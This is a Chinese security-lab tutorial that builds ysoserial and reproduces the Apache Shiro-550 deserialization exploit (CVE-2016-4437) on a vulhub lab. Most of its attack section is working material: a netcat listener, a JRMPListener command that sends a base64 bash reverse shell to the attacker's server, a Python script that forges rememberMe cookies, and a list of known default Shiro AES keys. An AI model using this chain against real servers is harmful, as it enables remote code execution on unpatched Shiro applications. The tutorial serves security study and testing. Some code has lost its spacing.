> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/yZuLw9flSLVkw3-1ukAdRQ)

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrynhicSC9oWDibJEW3BUhEIWManZGCkeyNxMv9pQzctc5ZF2mlFAnYQegWvg559w1Gw4nJndYHQaJUg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

戟星安全实验室

  

    忆享科技旗下高端的网络安全攻防服务团队.安服内容包括渗透测试、代码审计、应急响应、漏洞研究、威胁情报、安全运维、攻防演练等

本文约2000字，阅读约需10分钟。

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/ljg2cQ6UPLjvs6DREsctkkZ0ukYpopiakg8eQpvoem0KDawXsxrXL7uq7fZqJCSgzkibj7u4abn5lmB1OOhUcC9g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

0x01  Ysoserial的下载与配置

  

**下载ysoserial**

在GitHub上搜索ysoserial下载，目前下载地址为:

```
https://github.com/frohoff/ysoserial
```

解压出文件我们发现没有Jar包，我们需要把他打包成Jar包，才能使用他。

这个时候我们需要**Maven****工具**进行打包。

官网下载地址为：

```
https://maven.apache.org/
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJry1xBbEDbTyIVvfSTnE2rl9w42GdXffZMCcQMEqkRo5kyRTRbqaXSyThSz43C5icT9EBhhFiaPLkfqQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

Maven 是一个项目管理工具，它包含了一个项目对象模型（Project Object Model），反映在配置中，就是一个 pom.xml 文件。是一组标准集合，一个项目的生命周期、一个依赖管理系统，另外还包括定义在项目生命周期阶段的插件(plugin)以及目标(goal)。  

当我们使用 Maven 的使用，通过一个自定义的项目对象模型，pom.xml 来详细描述我们自己的项目。

Maven 中的有两大核心：

依赖管理：对 jar 的统一管理(Maven 提供了一个 Maven 的中央仓库，https://mvnrepository.com/，当我们在项目中添加完依赖之后，Maven 会自动去中央仓库下载相关的依赖，并且解决依赖的依赖问题)

项目构建：对项目进行编译、测试、打包、部署、上传到私服等。

打开cmd 运行：

```
unzip apache-maven-3.8.5-bin.zip
```

或者用解压工具解压。

Maven 是 Java 项目，因此必须先安装 JDK。您的JDK和Maven都要设置环境变量。

添加到PATH：打开系统属性（WinKey + Pause），选择“高级”选项卡和“环境变量”按钮，然后添加或选择PATH 变量具有值的用户变量C:\Program Files\apache-maven-3.8.5\bin。相同的对话框可用于设置JAVA_HOMEJDK 的位置，例如C:\Program Files\Java\jdk1.7.0_51

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

打开cmd运行mvn –v查看是否运行成功

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

报错。

由于maven3.3及以上需要jdk7以上才能支持，因此安装jdk7即可。

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

表示运行成功。

**Maven****常用命令**

<table cellspacing="0" cellpadding="0"><thead><tr><td style="border-width: 1px;border-style: solid;border-color: silver;background: rgb(250, 250, 250);padding: 8px 14px;"><p><strong>常用命令</strong></p></td><td style="border-top: 1px solid silver;border-right: 1px solid silver;border-bottom: 1px solid silver;border-left: none;background: rgb(250, 250, 250);padding: 8px 14px;"><p><strong>中文含义</strong></p></td><td style="border-top: 1px solid silver;border-right: 1px solid silver;border-bottom: 1px solid silver;border-left: none;background: rgb(250, 250, 250);padding: 8px 14px;"><p><strong>说明</strong></p></td></tr></thead><tbody><tr><td style="border-right: 1px solid silver;border-bottom: 1px solid silver;border-left: 1px solid silver;border-top: none;padding: 8px 14px;"><p>mvn clean</p></td><td style="border-top:none;border-left:none;border-bottom:solid silver 1px;border-right:solid silver 1px;padding:8px 14px 8px 14px;"><p>清理</p></td><td style="border-top:none;border-left:none;border-bottom:solid silver 1px;border-right:solid silver 1px;padding:8px 14px 8px 14px;"><p>这个命令可以用来清理已经编译好的文件</p></td></tr><tr><td style="border-right: 1px solid silver;border-bottom: 1px solid silver;border-left: 1px solid silver;border-top: none;padding: 8px 14px;"><p>mvn compile</p></td><td style="border-top:none;border-left:none;border-bottom:solid silver 1px;border-right:solid silver 1px;padding:8px 14px 8px 14px;"><p>编译</p></td><td style="border-top:none;border-left:none;border-bottom:solid silver 1px;border-right:solid silver 1px;padding:8px 14px 8px 14px;"><p>将 Java 代码编译成 Class 文件</p></td></tr><tr><td style="border-right: 1px solid silver;border-bottom: 1px solid silver;border-left: 1px solid silver;border-top: none;padding: 8px 14px;"><p>mvn test</p></td><td style="border-top:none;border-left:none;border-bottom:solid silver 1px;border-right:solid silver 1px;padding:8px 14px 8px 14px;"><p>测试</p></td><td style="border-top:none;border-left:none;border-bottom:solid silver 1px;border-right:solid silver 1px;padding:8px 14px 8px 14px;"><p>项目测试</p></td></tr><tr><td style="border-right: 1px solid silver;border-bottom: 1px solid silver;border-left: 1px solid silver;border-top: none;padding: 8px 14px;"><p>mvn package</p></td><td style="border-top:none;border-left:none;border-bottom:solid silver 1px;border-right:solid silver 1px;padding:8px 14px 8px 14px;"><p>打包</p></td><td style="border-top:none;border-left:none;border-bottom:solid silver 1px;border-right:solid silver 1px;padding:8px 14px 8px 14px;"><p>根据用户的配置，将项目打成 jar 包或者 war 包</p></td></tr><tr><td style="border-right: 1px solid silver;border-bottom: 1px solid silver;border-left: 1px solid silver;border-top: none;padding: 8px 14px;"><p>mvn install</p></td><td style="border-top:none;border-left:none;border-bottom:solid silver 1px;border-right:solid silver 1px;padding:8px 14px 8px 14px;"><p>安装</p></td><td style="border-top:none;border-left:none;border-bottom:solid silver 1px;border-right:solid silver 1px;padding:8px 14px 8px 14px;"><p>手动向本地仓库安装一个 jar</p></td></tr><tr><td style="border-right: 1px solid silver;border-bottom: 1px solid silver;border-left: 1px solid silver;border-top: none;padding: 8px 14px;"><p>mvn deploy</p></td><td style="border-top:none;border-left:none;border-bottom:solid silver 1px;border-right:solid silver 1px;padding:8px 14px 8px 14px;"><p>上传</p></td><td style="border-top:none;border-left:none;border-bottom:solid silver 1px;border-right:solid silver 1px;padding:8px 14px 8px 14px;"><p>将 jar 上传到私服</p></td></tr></tbody></table>

这里我们只需要打包，.路径一定不要有中文否则会报错，进入有pom.xml 文件下 使用cmd命令mvn clean package-DskipTests命令进行编译。

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

这个样子表示成功

在target目录下执行cmd

输入命令：

```
java-jar ysoserial-0.0.6-SNAPSHOT-all.jar
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

这个样子表示成功。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

0x02 Ysoserial复现Shiro反序列化漏洞

  

---

我们直接以漏洞复现的方式，学习ysoserial的使用。

**以****Shiro****反序列化漏洞****shiro550 (CVE-2016-4437)****为例。**

我打开了我的vps,用vulhub靶场来创建这种漏洞环境。

```
systemctl | grep docker
```

查看docker服务是否启动，没有启动的话启动docker：

```
systemctl start docker
```

用docker下载vulhub靶场

```
`cd vulhub-master``cd shiro/CVE-2016-4437`
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

启动容器

```
`docker-compose build``docker-compose up -d`
```

启动成功后，

```
docker-composeps  查看端口
```

还有一个靶场，不成功可以挨个试试：

```
`docker pull medicean/vulapps:s_shiro_1``docker run -d -p 80:8080medicean/vulapps:s_shiro_1`
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

环境搭建成功后，

公网服务器kali①：攻击机，运行ysoserial工具。

Shiro漏洞服务器②：目标机。

打开自己的kali攻击机：①

监听2222端口

```
nc -lvp 7777
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

使用ysoserial开启端口，执行反弹命令：

```
java -cpysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 6666CommonsCollections2 "bash -c {echo,反弹shell的base64编码}|{base64,-d}|{bash,-i}"
```

  

其中{echo,反弹shell的base64编码}里的IP是公网服务器kali①的IP：nc监听的机器。

命令的格式为：

```
java -cp ysoserial-0.0.6-SNAPSHOT-all.jarysoserial.exploit.JRMPListener  【port】 CommonsCollections1 '【commands】'
```

  

port:公网vps上监听的端口号

commands:需要执行的命令

这里有个坑，那就是CommonsCollections5这个利用链可以从1-5挨个试试，否则反弹不了shell。这里我改用CommonsCollections2才成功。

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

出现* * OpeningJRMP listener on 6666 说明成功了。

将以下生成cookie的poc代码命名为shiro.py放到ysoserial所在的target目录下

```
`import sys``import uuid``import base64``import subprocess``from Crypto.Cipher import AES``def encode_rememberme(command):` `popen =subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar','JRMPClient', command], stdout=subprocess.PIPE)` `BS =AES.block_size` `pad = lambdas: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()` `key =base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")` `iv =uuid.uuid4().bytes` `encryptor =AES.new(key, AES.MODE_CBC, iv)` `file_body =pad(popen.stdout.read())` `base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))` `returnbase64_ciphertext` `if __name__ == '__main__':` `payload =encode_rememberme(sys.argv[1])``print"rememberMe={0}".format(payload.decode())`
```

  

代码里有默认key值；常见的key值有：

```
`4AvVhmFLUs0KTA3Kprsdag==``3AvVhmFLUs0KTA3Kprsdag==``2AvVhdsgUs0FSA3SDFAdag==``6ZmI6I2j5Y+R5aSn5ZOlAA==``wGiHplamyXlVB11UXWol8g==``cmVtZW1iZXJNZQAAAAAAAA==``Z3VucwAAAAAAAAAAAAAAAA==``ZnJlc2h6Y24xMjM0NTY3OA==``L7RioUULEFhRyxM7a2R/Yg==``RVZBTk5JR0hUTFlfV0FPVQ==``fCq+/xW488hMTCD+cmJ3aQ==``WkhBTkdYSUFPSEVJX0NBVA==``1QWLxg+NYmxraMoxAXu/Iw==``WcfHGU25gNnTxTlmJMeSpw==``a2VlcE9uR29pbmdBbmRGaQ==``bWluZS1hc3NldC1rZXk6QQ==``5aaC5qKm5oqA5pyvAAAAAA==``kPH+bIxk5D2deZiIxcaaaA==``r0e3c16IdVkouZgk1TKVMg==``ZUdsaGJuSmxibVI2ZHc9PQ==``U3ByaW5nQmxhZGUAAAAAAA==``LEGEND-CAMPUS-CIPHERKEY==``1QWLxg+NYmxraMoxAXu/Iw==`
```

  

以python2执行命令：

```
python shiro.py  公网服务器kali①的IP:ysoserial监听的java端口
```

运行脚本时可能会报错：

```
from Crypto.Cipher import AES
```

首先执行下面2个步骤

```
`pip install crypto``pip install pycryptodome`
```

安装完成直接使用还是提示找不到：

把crypto首字母改成大写：

```
Crypto
```

如果没有pip 我执行了

```
wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
```

然后运行：

```
python get-pip.py
```

当然得进入文件夹目录下执行。

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

如果执行成功：RememberMe后头的是生成的cookie

在前端页面抓一个勾选rememberme的数据包

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

将生成的cookie复制到数据包中

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

发送包之后在Java监听端可看到会话：

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

在7777监听到反弹回来的shell

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

成功复现。

  

 声明

    由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，破军安全实验室及文章作者不为此承担任何责任。

    戟星安全实验室拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经破军安全实验室允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

戟星安全实验室

# 长按二维码 关注我们 #